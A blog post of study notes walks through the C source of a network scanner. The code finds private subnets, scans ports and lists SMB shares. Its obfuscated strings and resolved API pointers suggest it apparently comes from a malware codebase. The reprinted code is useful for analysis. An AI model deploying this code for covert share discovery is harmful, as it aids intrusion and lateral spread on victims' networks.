<h2 id="networkscanner"><a href="#networkscanner" class="headerlink" title="networkscanner"></a>networkscanner</h2><p>complex network scanner code.</p>
<ul>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EnumShares"><a href="#EnumShares" class="headerlink" title="EnumShares"></a>EnumShares</h3><ul>
<li><p>NetShareEnum</p>
<ul>
<li>Retrieves information about each shared resource on a server.</li>
</ul>
</li>
<li><p>sharepath</p>
<table>
<thead>
<tr>
<th align="left">Constant&#x2F;value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STYPE_DISKTREE0x00000000</td>
<td align="left">Disk drive</td>
</tr>
<tr>
<td align="left">STYPE_SPECIAL0x80000000</td>
<td align="left">Special share reserved for interprocess communication (IPC$) or remote administration of the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703">server</a> (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.</td>
</tr>
<tr>
<td align="left">STYPE_TEMPORARY0x40000000</td>
<td align="left">A temporary share that is not persisted for creation each time the file server initializes.</td>
</tr>
</tbody></table>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">network_scanner::EnumShares</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in PWCHAR pwszIpAddress, </span></span><br><span class="line"><span class="params">	__out PSHARE_LIST ShareList</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS Result;</span><br><span class="line">	LPSHARE_INFO_1 ShareInfoBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD er = <span class="number">0</span>, tr = <span class="number">0</span>, resume = <span class="number">0</span>;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, <span class="number">1</span>, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume);</span><br><span class="line">		<span class="keyword">if</span> (Result == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (DWORD i = <span class="number">1</span>; i &lt;= er; i++)</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_SPECIAL	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) </span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(<span class="keyword">sizeof</span>(SHARE_INFO));</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span> (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(<span class="string">L&quot;ADMIN$&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">						plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress);</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname);</span><br><span class="line"></span><br><span class="line">						logs::Write(OBFW(<span class="string">L&quot;Found share %s.&quot;</span>), ShareInfo-&gt;wszSharePath);</span><br><span class="line">						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				TempShareInfo++;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pNetApiBufferFree(ShareInfoBuffer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (Result == ERROR_MORE_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StartScan"><a href="#StartScan" class="headerlink" title="StartScan"></a>StartScan</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">network_scanner::StartScan()</span><br><span class="line">&#123;</span><br><span class="line">	WSADATA WsaData;</span><br><span class="line">	HANDLE hHostHandler = <span class="literal">NULL</span>, hPortScan = <span class="literal">NULL</span>;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	pWSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;WsaData);</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetConnectEX()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get ConnectEx.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetCurrentIpAddress();</span><br><span class="line">	</span><br><span class="line">	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create io completion port.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_INIT(&amp;g_SubnetList);</span><br><span class="line">	TAILQ_INIT(&amp;g_HostList);</span><br><span class="line">	TAILQ_INIT(&amp;g_ConnectionList);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetSubnets(&amp;g_SubnetList)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get subnets.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hHostHandler = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;HostHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create host thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hPortScan = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;PortScanHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hPortScan == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create port scan thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pPostQueuedCompletionStatus(g_IocpHandle, <span class="number">0</span>, START_COMPLETION_KEY, <span class="literal">NULL</span>);</span><br><span class="line">	pWaitForSingleObject(hPortScan, INFINITE);</span><br><span class="line"></span><br><span class="line">	AddHost(STOP_MARKER);</span><br><span class="line">	pWaitForSingleObject(hHostHandler, INFINITE);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	pDeleteCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle) &#123;</span><br><span class="line">		pCloseHandle(g_IocpHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler) &#123;</span><br><span class="line">		pCloseHandle(hHostHandler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hPortScan) &#123;</span><br><span class="line">		pCloseHandle(hPortScan);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pWSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="GetCurrentIpAddress"><a href="#GetCurrentIpAddress" class="headerlink" title="GetCurrentIpAddress"></a>GetCurrentIpAddress</h3><ul>
<li><p>pgethostname</p>
<ul>
<li><p>SOCKET_ERROR &#x3D;&#x3D; (INT)pgethostname(szHostName, 256)</p>
</li>
<li><p>g_HostEntry &#x3D; (struct hostent*)pgethostbyname(szHostName);</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>If no error occurs, <strong>gethostname</strong> returns zero. Otherwise, </p>
<p>it returns SOCKET_ERROR and a specific error code can be retrieved by calling <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD <span class="title function_">GetCurrentIpAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	CHAR szHostName[<span class="number">256</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">InAddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == (INT)pgethostname(szHostName, <span class="number">256</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_HostEntry = (<span class="keyword">struct</span> hostent*)pgethostbyname(szHostName);</span><br><span class="line">	<span class="keyword">if</span> (!g_HostEntry) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetConnectEX"><a href="#GetConnectEX" class="headerlink" title="GetConnectEX"></a>GetConnectEX</h3><ul>
<li>WSASocketW<ul>
<li>creates a socket that is bound to a specific transport-service provider</li>
</ul>
</li>
<li>WSAIoctl<ul>
<li>controls the mode of a socket.</li>
</ul>
</li>
<li>closesocket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GetConnectEX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwBytes;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	GUID guid = WSAID_CONNECTEX;</span><br><span class="line">	rc = (<span class="type">int</span>)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,</span><br><span class="line">		&amp;guid, <span class="keyword">sizeof</span>(guid),</span><br><span class="line">		&amp;g_ConnectEx, <span class="keyword">sizeof</span>(g_ConnectEx),</span><br><span class="line">		&amp;dwBytes, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	rc =(<span class="type">int</span>) pclosesocket(sock);</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetSubnets"><a href="#GetSubnets" class="headerlink" title="GetSubnets"></a>GetSubnets</h3><ul>
<li>GetIpNetTable<ul>
<li>GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size)</li>
<li>ULONG Result &#x3D; (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result)</li>
<li>The <strong>GetIfTable</strong> function retrieves the MIB-II interface table.</li>
</ul>
</li>
</ul>
<p>if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host.</p>
<p>And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);</span><br><span class="line">	<span class="keyword">if</span> (!IpNetTable) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (Result != ERROR_SUCCESS) &#123;</span><br><span class="line">		</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;GetIpNetTable fails. GetLastError = %lu&quot;</span>), pGetLastError());</span><br><span class="line">		<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IpNetTable-&gt;dwNumEntries; i++) &#123;</span><br><span class="line"></span><br><span class="line">		WCHAR wszIpAddress[INET_ADDRSTRLEN];</span><br><span class="line">		ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr;	</span><br><span class="line">		PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr;</span><br><span class="line">		ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen;</span><br><span class="line">		</span><br><span class="line">		RtlSecureZeroMemory(wszIpAddress, <span class="keyword">sizeof</span>(wszIpAddress));</span><br><span class="line"></span><br><span class="line">		IN_ADDR InAddr;</span><br><span class="line">		InAddr.S_un.S_addr = dwAddress;</span><br><span class="line">		PCHAR szIpAddress = pinet_ntoa(InAddr);</span><br><span class="line">		DWORD le = WSAGetLastError();</span><br><span class="line"></span><br><span class="line">		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;172.&quot;</span>));</span><br><span class="line">		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;192.168.&quot;</span>));</span><br><span class="line">		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;10.&quot;</span>));</span><br><span class="line">		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;169.&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p1 == szIpAddress ||</span><br><span class="line">			p2 == szIpAddress ||</span><br><span class="line">			p3 == szIpAddress ||</span><br><span class="line">			p4 == szIpAddress)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">			PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line">			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, <span class="number">3</span>)) &#123;</span><br><span class="line"></span><br><span class="line">					Found = TRUE;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">				*(ULONG*)bAddres = dwAddress;</span><br><span class="line">				bAddres[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(<span class="keyword">sizeof</span>(SUBNET_INFO));</span><br><span class="line">				<span class="keyword">if</span> (!NewSubnet) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line">				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HostHandler"><a href="#HostHandler" class="headerlink" title="HostHandler"></a>HostHandler</h3><ul>
<li><p><code>pEnterCriticalSection(&amp;g_CriticalSection);</code></p>
<ul>
<li><p>When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.<a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
<ul>
<li><p>&#96;&#96;&#96;c<br>  pEnterCriticalSection(&amp;g_CriticalSection);</p>
<p>  PHOST_INFO HostInfo &#x3D; TAILQ_FIRST(&amp;g_HostList);<br>  if (HostInfo &#x3D;&#x3D; NULL) {<br>  pLeaveCriticalSection(&amp;g_CriticalSection);<br>  pSleep(1000);<br>  continue;<br>      }<br>  TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);<br>  pLeaveCriticalSection(&amp;g_CriticalSection);</p>
